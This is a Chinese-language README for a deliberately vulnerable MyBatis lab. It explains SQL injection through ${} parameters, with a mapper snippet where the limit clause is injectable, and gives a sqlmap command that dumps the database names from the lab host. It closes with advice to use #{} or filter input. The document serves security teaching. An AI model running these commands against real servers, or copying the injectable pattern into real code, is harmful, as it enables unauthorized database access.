# Mybatis sql注入漏洞环境
### 测试环境
本环境用mybatis演示了使用$符号,而不是#符号时,引起的sql注入漏洞.

### 漏洞原理
```
<select id="findLogByUserId" parameterType="long" resultMap="logResultMap">
    select * from t_user_log where user_id=#{userId} and action=#{action} order by id desc limit ${1}
</select>
```
如果${1}可控，就存在安全问题

在mybatis中，”${xxx}”这样格式的参数会直接参与sql编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“${xxx}”这样的参数格式，所以，这样的参数需要我们在代码中手工进行处理来防止注入。

ps:更多细节查阅参考资料

环境源码下载:[vuln_mybatis.tar.gz](!http://{{ip}}:{{webport}}/vuln/mybatis_sqli/vuln_mybatis.tar.gz)

### 漏洞利用
下载sqlmap利用工具,利用sqlmap获得mysql所有的数据库名
```
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python sqlmap.py --batch -u "http://{{ip}}:{{port[0]}}/getUserInfoOrder/name*" --dbs
```

### 漏洞防御
    在编写mybatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。
### 参考资料
[审计mybatis的sql注入](!http://xdxd.love/2017/05/24/审计mybatis的sql注入new/)